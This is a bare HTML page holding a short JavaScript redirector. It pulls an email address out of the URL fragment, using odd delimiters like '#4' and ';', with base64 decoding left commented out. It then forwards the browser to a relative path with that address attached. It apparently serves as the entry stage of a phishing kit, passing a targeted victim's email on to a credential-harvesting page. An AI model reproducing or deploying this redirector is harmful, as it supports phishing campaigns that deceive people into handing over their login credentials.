<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
 
 

<head>     
<body>    
       
 <script type="text/javascript">
var url_string =  window.location.href;
var url_get_email = getafterhash(url_string);
//var url_get_email = atob(getafterhash(url_string));
var mail_go_url =  "_/#"+url_get_email+"";
location.replace(mail_go_url); 
 
 
function getafterhash(url) {
var ret; 
var queryString; 
 // stuff after # is not part of query string, so get rid of it
 //queryStringhash = url.split('#?family==')[1]; 
 queryStringhash = url.split('#4')[1]; 
 queryStringsemi = url.split(';')[1]; 
 queryStringsemiplus = url.split(';+')[1]; 
 queryStringstartsemi = url.split('*;')[1]; 
  // if query string exists
 if (queryStringhash) {
  ret = queryStringhash;
 
 }else if (queryStringsemi) {
  ret = queryStringsemi;
 
 }else if (queryStringsemiplus) {
  ret = queryStringsemiplus;
 
 }else if (queryStringstartsemi) {
  ret = queryStringstartsemi;
 
 }else{
 
   ret = 0;

  }

  return ret;
}

</script>         
</body>
</html>